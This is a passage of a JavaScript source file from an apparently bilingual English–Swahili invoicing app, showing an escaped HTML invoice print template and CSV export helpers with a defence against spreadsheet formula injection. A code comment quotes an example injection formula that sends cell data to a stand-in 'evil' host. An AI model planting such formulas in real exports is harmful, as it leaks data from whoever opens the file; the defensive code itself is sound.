      ${invoice.customerPhone ? `<p>Tel: ${escapeHTML(invoice.customerPhone)}</p>` : ''}
      ${invoice.customerEmail ? `<p>Email: ${escapeHTML(invoice.customerEmail)}</p>` : ''}
      ${invoice.customerTin ? `<p>TIN: ${escapeHTML(invoice.customerTin)}</p>` : ''}
    </div>
    <div class="party">
      <h3>${t('SHIP TO', 'PALE UNAPELEKA')}</h3>
      <div class="name">${escapeHTML(invoice.shipToName || invoice.customerName || '—')}</div>
      ${invoice.shipToAddress ? `<p>${escapeHTML(invoice.shipToAddress)}</p>` : ''}
      ${invoice.shipToPhone ? `<p>Tel: ${escapeHTML(invoice.shipToPhone)}</p>` : ''}
    </div>
  </div>
  <table>
    <thead><tr><th>#</th><th>${t('Description', 'Maelezo')}</th><th>${t('Qty', 'Idadi')}</th><th>${t('Unit Price', 'Bei')}</th><th>${t('Disc %', 'Punguzo %')}</th><th>${t('Amount', 'Kiasi')}</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>
  <div class="words">${t('Amount in Words:', 'Kiasi kwa Maneno:')} ${escapeHTML(words)}</div>
  <div class="totals"><table><tbody>${totalRows}</tbody></table></div>
  ${invoice.notes ? `<div class="notes"><h4>${t('NOTES', 'MAELEZO')}</h4><p>${escapeHTML(invoice.notes)}</p></div>` : ''}
  <div class="sign">
    <div class="sign-cell">
      ${opts.signatureDataUrl ? `<img src="${escapeHTML(opts.signatureDataUrl)}" alt="">` : ''}
      <div class="sign-rule"></div>
      <div class="sign-label">${t('Authorized Signature', 'Sahihi Iliyoidhinishwa')}</div>
    </div>
    <div class="sign-cell">
      ${opts.stampDataUrl
        ? `<img class="stamp" src="${escapeHTML(opts.stampDataUrl)}" alt=""><div class="sign-label">${t('Company Stamp', 'Muhuri wa Kampuni')}</div>`
        : `<div class="stamp-ring">${t('COMPANY STAMP', 'MUHURI WA KAMPUNI')}</div>`}
    </div>
  </div>
  <div class="footer">${escapeHTML(company.businessName || fallbackBusinessName())}${company.website ? ' • ' + escapeHTML(company.website) : ''}</div>
  <script>window.onload = function(){ window.print(); };</script>
</body>
</html>`);
  win.document.close();
}

/* ---------------- CSV Export ---------------- */

/**
 * Escape one CSV cell.
 *
 * Two separate jobs, and the second one used to be missing:
 *
 *   1. CSV syntax — a value containing a quote, comma or newline must be
 *      wrapped and its own quotes doubled.
 *   2. Spreadsheet formula injection (OWASP CSV Injection) — Excel, Google
 *      Sheets and LibreOffice evaluate a cell that *starts* with `=`, `+`, `-`,
 *      `@`, TAB or CR. Customer names, product names, notes and feedback text
 *      are all user data, so a name of `=HYPERLINK("http://evil/"&A1,"x")`
 *      would execute on whoever opens the export. Prefixing an apostrophe
 *      forces the cell to be read as text.
 *
 * Exported (rather than module-private) so `scripts/test-csv.js` can assert the
 * behaviour without a browser.
 */
export function csvEscape(value) {
  let s = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  if (/[",\n\r]/.test(s)) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

/** Export an array of objects to CSV and download. */
export function exportCSV(rows, filename) {
  if (!rows || !rows.length) return;
  const headers = Object.keys(rows[0]);
  const lines = [
    headers.map(csvEscape).join(','),
    ...rows.map((row) => headers.map((h) => csvEscape(row[h])).join(',')),
  ];
  const blob = new Blob(['\uFEFF' + lines.join('\r\n')], { type: 'text/csv;charset=utf-8;' });
  downloadBlob(blob, filename);
}

/** Export invoices to CSV. */
export function exportInvoicesCSV(invoices, currency) {
  const rows = invoices.map((inv) => ({
    'Invoice No': inv.number || '',
    'Issue Date': inv.issueDate || '',
    'Due Date': inv.dueDate || '',
    'Customer': inv.customerName || '',
    'Phone': inv.customerPhone || '',
    'Status': statusLabel(inv.status),
    'Subtotal': inv.subtotal ?? 0,
    'Discount': inv.invoiceDiscount ?? 0,
    'Tax': inv.tax ?? 0,
    'Shipping': inv.shipping ?? 0,
    'Grand Total': inv.grandTotal ?? 0,
    'Amount Paid': inv.amountPaid ?? 0,
    'Balance': inv.balance ?? 0,
    'Currency': inv.currency || 'TZS',
  }));
  exportCSV(rows, `invoices_${new Date().toISOString().slice(0, 10)}.csv`);
}

/** Export customers to CSV. */
export function exportCustomersCSV(customers) {
  const rows = customers.map((c) => ({
    'Name': c.name || '',
    'Phone': c.phone || '',
    'Email': c.email || '',
    'TIN': c.tin || '',
    'Address': c.address || '',
    'Notes': c.notes || '',
  }));
  exportCSV(rows, `customers_${new Date().toISOString().slice(0, 10)}.csv`);
}

/** Export products to CSV. */
export function exportProductsCSV(products) {
  const rows = products.map((p) => ({
    'Name': p.name || '',
    'SKU': p.sku || '',
    'Barcode': p.barcode || '',
    'Category': p.category || '',
    'Unit': p.unit || '',
    'Cost Price': p.costPrice ?? 0,
    'Selling Price': p.sellingPrice ?? 0,
    'Tax %': p.taxRate ?? 0,
    'Stock': p.stock ?? 0,
    'Status': p.status || 'active',
  }));
  exportCSV(rows, `products_${new Date().toISOString().slice(0, 10)}.csv`);
}